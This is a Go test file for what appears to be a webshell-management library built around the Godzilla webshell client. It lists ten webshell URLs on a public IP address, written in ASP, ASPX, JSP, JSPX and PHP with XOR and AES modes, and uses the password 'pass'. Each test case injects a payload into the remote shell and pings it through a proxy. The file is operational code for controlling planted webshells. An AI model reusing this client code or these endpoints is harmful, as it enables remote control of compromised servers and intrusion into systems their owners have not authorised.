package wsm

import (
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/godzilla"
	"testing"
)

const (
	AspRawShellUrl   = "http://139.196.175.86:8081/xorraw.asp"
	AspBs64ShellUrl  = "http://139.196.175.86:8081/xorbs64.asp"
	AspxBs64ShellUrl = "http://139.196.175.86:8081/bs64.aspx"
	AspxRawShellUrl  = "http://139.196.175.86:8081/raw.aspx"
	JspBs64ShellUrl  = "http://139.196.175.86:8080/bs64.jsp"
	JspRawShellUrl   = "http://139.196.175.86:8080/raw.jsp"
	JspxBs64ShellUrl = "http://139.196.175.86:8080/bs64.jspx"
	JspxRawShellUrl  = "http://139.196.175.86:8080/raw.jspx"
	PhpBs64ShellUrl  = "http://139.196.175.86/bs64.php"
	PhpRawShellUrl   = "http://139.196.175.86/raw.php"
)

func TestGodzillaInfo_Ping(t *testing.T) {
	type fields struct {
		BaseShell       BaseShell
		Key             string
		secretKey       []byte
		Crypto          godzilla.CrypticType
		Encoding        string
		encoding        godzilla.EncodingCharset
		ReqLeft         string
		ReqRight        string
		dynamicFuncName map[string]string
	}
	type args struct {
		p []shell.IParams
	}
	tests := []struct {
		name    string
		fields  fields
		args    args
		want    bool
		wantErr bool
	}{
		{
			name: "哥斯拉 ASP ASP_XOR_BASE64",
			fields: fields{
				BaseShell: BaseShell{
					Url:      AspBs64ShellUrl,
					Password: "pass",
					Script:   shell.AspScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.ASP_XOR_BASE64,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 ASP ASP_XOR_RAW",
			fields: fields{
				BaseShell: BaseShell{
					Url:      AspRawShellUrl,
					Password: "pass",
					Script:   shell.AspScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.ASP_XOR_RAW,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 ASPX CSHARP_AES_BASE64",
			fields: fields{
				BaseShell: BaseShell{
					Url:      AspxBs64ShellUrl,
					Password: "pass",
					Script:   shell.CsharpScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.CSHARP_AES_BASE64,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 ASPX CSHARP_AES_RAW",
			fields: fields{
				BaseShell: BaseShell{
					Url:      AspxRawShellUrl,
					Password: "pass",
					Script:   shell.CsharpScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.CSHARP_AES_RAW,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 JSP JAVA_AES_BASE64",
			fields: fields{
				BaseShell: BaseShell{
					Url:      JspBs64ShellUrl,
					Password: "pass",
					Script:   shell.JavaScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.JAVA_AES_BASE64,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 JSP JAVA_AES_RAW",
			fields: fields{
				BaseShell: BaseShell{
					Url:      JspRawShellUrl,
					Password: "pass",
					Script:   shell.JavaScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.JAVA_AES_RAW,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 JSPX JAVA_AES_BASE64",
			fields: fields{
				BaseShell: BaseShell{
					Url:      JspxBs64ShellUrl,
					Password: "pass",
					Script:   shell.JavaScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.JAVA_AES_BASE64,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 JSPX JAVA_AES_RAW",
			fields: fields{
				BaseShell: BaseShell{
					Url:      JspxRawShellUrl,
					Password: "pass",
					Script:   shell.JavaScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.JAVA_AES_RAW,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 PHP_XOR_BASE64",
			fields: fields{
				BaseShell: BaseShell{
					Url:      PhpBs64ShellUrl,
					Password: "pass",
					Script:   shell.PhpScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.PHP_XOR_BASE64,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
		{
			name: "哥斯拉 PHP_XOR_RAW",
			fields: fields{
				BaseShell: BaseShell{
					Url:      PhpRawShellUrl,
					Password: "pass",
					Script:   shell.PhpScript,
					Proxy:    "http://127.0.0.1:9999",
				},
				Key:      "key",
				Crypto:   godzilla.PHP_XOR_RAW,
				Encoding: godzilla.UTF8CharSet,
			},
			args:    args{p: nil},
			want:    true,
			wantErr: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := &GodzillaInfo{
				BaseShell:       tt.fields.BaseShell,
				Key:             tt.fields.Key,
				secretKey:       tt.fields.secretKey,
				Crypto:          tt.fields.Crypto,
				Encoding:        tt.fields.Encoding,
				encoding:        tt.fields.encoding,
				ReqLeft:         tt.fields.ReqLeft,
				ReqRight:        tt.fields.ReqRight,
				dynamicFuncName: tt.fields.dynamicFuncName,
			}
			g, err := NewGodzillaInfo(g)
			if err != nil {
				t.Errorf("NewGodzillaInfo(g) error = %v, wantErr %v", err, nil)
				return
			}
			err = g.InjectPayload()
			if err != nil {
				t.Errorf("InjectPayload() error = %v, wantErr %v", err, nil)
				return
			}
			got, err := g.Ping(tt.args.p...)
			if (err != nil) != tt.wantErr {
				t.Errorf("Ping() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if got != tt.want {
				t.Errorf("Ping() got = %v, want %v", got, tt.want)
			}
		})
	}
}
